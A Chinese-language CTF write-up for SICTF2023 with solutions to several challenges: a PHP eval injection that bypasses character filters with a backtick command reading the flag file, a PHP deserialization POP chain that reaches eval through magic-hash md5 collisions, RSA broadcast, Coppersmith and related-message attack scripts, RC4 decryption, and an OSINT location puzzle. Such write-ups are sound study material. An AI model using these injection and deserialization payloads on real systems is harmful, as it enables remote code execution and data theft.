title: SICTF2023

RCE

shell
<?php
error_reporting(0);
highlight_file(__FILE__);
$code = $_POST['code'];
$code = str_replace("(","hacker",$code);
$code = str_replace(".","hacker",$code);
eval($code);
?>

根据代码发现（被过滤，所以不能用system()函数，使用echo进行rce，发现.也被过滤，直接通配符

shell
code=echo `cat /f*`;
#SICTF{62edaaf5-f176-4dd7-9eea-64f4b700cc4f} #!/bin/bash echo $FLAG > /flag export FLAG=not_flag FLAG=not_flag rm -f /flag.sh

我全都要

shell
<?php
highlight_file(__FILE__);

class B{
    public $pop;
    public $i;
    public $nogame;

    public function __destruct()
    {
        if(preg_match("/233333333/",$this->pop)){
            echo "这是一道签到题，不能让新生一直做不出来遭受打击";
        }
    }

    public function game(){
        echo "扣1送地狱火";
        if ($this->i = "1"){
            echo '<img src=\'R.jpg\'>';
            $this->nogame->love();
        }
    }

    public function __clone(){
        echo "必须执行";
        eval($_POST["cmd"]);
    }
}


class A{
    public $Aec;
    public $girl;
    public $boy;

    public function __toString()
    {
        echo "I also want to fall in love";
        if($this->girl != $this->boy && md5($this->girl) == md5($this->boy)){
            $this->Aec->game();
        }
    }


}


class P{
    public $MyLover;
    public function __call($name, $arguments)
    {
        echo "有对象我会在这打CTF???看我克隆一个对象！";
        if ($name != "game") {
            echo "打游戏去，别想着对象了";
            $this->MyLover = clone new B;
        }
    }


}


if ($_GET["A_B_C"]){
    $poc=$_GET["A_B_C"];
    unserialize($poc);
}

根据代码发现就是一个很简单的反序列化，直接构造

shell
$b=new B();
$b->i=1;
$p=new P();
$b->nogame=$p;
$a=new A();
$a->girl='QNKCDZO';
$a->boy='240610708';
$a->Aec=$b;
$b->pop=$a;
echo serialize($b);

Radio

rsa的广播攻击

python
import libnum
from gmpy2 import invert, gcd, iroot

def op(x):
    res = 1
    for i in x:
        res *= i
    return res

def CRT(m, a):
    assert (len(m) == len(a))
    M = op(m)
    sum = 0
    for m, a in zip(m, a):
        Mi = M // m
        ti = invert(Mi, m)
        sum += a * ti * Mi
    return sum % M
def GCRT(m, a):
    assert (len(m) == len(a))
    curm, cura = m[0], a[0]
    for m, a in zip(m[1:], a[1:]):
        d = gcd(curm, m)
        c = a - cura
        assert (c % d == 0)
        K = c // d * invert(curm // d, m // d)
        cura += curm * K
        curm = curm * m // d
    return cura % curm

Easy_CopperSmith

p的高位攻击

python
def p_high_attack(p_high,n,x_bits):
    """x_bits:表明未知的p低位"""
    P = PolynomialRing(Zmod(n),names=('x',),implementation='NTL')
    (x,) = P._first_ngens(1)
    f = p_high + x
    f = f.monic()
    res = f.small_roots(X=2**x_bits,beta=RR(log(p_high,n)),epsilon=0.02)
    return [p_high+int(x) for x in res]

p_high=6833525680083767201563383553257365403889275861180069149272377788671845720921410137177

print(p_high_attack(p_high<<230,n,230))

签到题来咯

相关信息攻击

python
from Crypto.Util.number import *
from gmpy2 import *
import binascii
def attack(c1, c2, n, e):
    PR.<x>=PolynomialRing(Zmod(n))
    # replace a,b,c,d
    g1 = (114*x+2333)^e - c1
    g2 = (514*x+4555)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()
    return -gcd(g1, g2)[0]

Myobject

简单的rc4，导出v18,v19,v20，常规脚本得到flag

python
import struct
import binascii

def rc4(data, key):
    S = list(range(256))
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    
    return bytes(out)

key = b'SIFLAG'
a=0x47CF225A0ED32730
hex_data=a.to_bytes(8,'little')
a=0xE50B6B47
hex_data+=a.to_bytes(4,'little')
hex_data=hex_data[:-1]
a=0x785C399BA538DE5
hex_data+=a.to_bytes(8,'little')
a=0x9F88FE10771C0107
hex_data+=a.to_bytes(8,'little')
data=hex_data
encrypted = rc4(data, key)
print(encrypted)

天桥

1旁边为公交车2公家车专用车道城市有北京，天津，贵阳，郑州，大连，杭州，海口，南京，武汉，乌鲁木齐，厦门，西安，沈阳，银川，民和，上海，深圳3中间护栏为金色4护栏底座有平行花纹，柱头为金字塔形状，侧面大孩子有个圆形或人形图案5在网上查找照片仔细对比，符合上述条件为西安市政护栏5从西安寻找并仔细对比6从图片看出道路两旁树叶形状推断树大概为梧桐树7从上述条件查找得出答案
